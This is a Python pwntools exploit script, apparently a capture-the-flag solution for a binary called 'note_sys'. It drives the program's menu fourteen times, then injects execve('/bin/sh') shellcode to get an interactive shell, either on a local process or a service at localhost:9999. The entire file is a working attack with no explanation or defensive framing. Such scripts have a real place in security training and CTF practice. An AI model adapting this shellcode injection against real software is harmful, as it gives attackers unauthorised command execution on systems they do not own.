#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    #  io = process("", env = {"LD_PRELOAD": ""})
    io = process("./note_sys")

else:
    io = remote("localhost", 9999)

#  elf = ELF("")
#  libc = ELF("")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)


if __name__ == "__main__":
    shellcode = asm(shellcraft.execve("/bin/sh"))
    for i in xrange(14):
        io.sendlineafter("choice:\n", "2")

    io.sendlineafter("choice:\n", "0")
    io.sendlineafter("characters\n", shellcode)
    
    io.interactive()
    io.close()

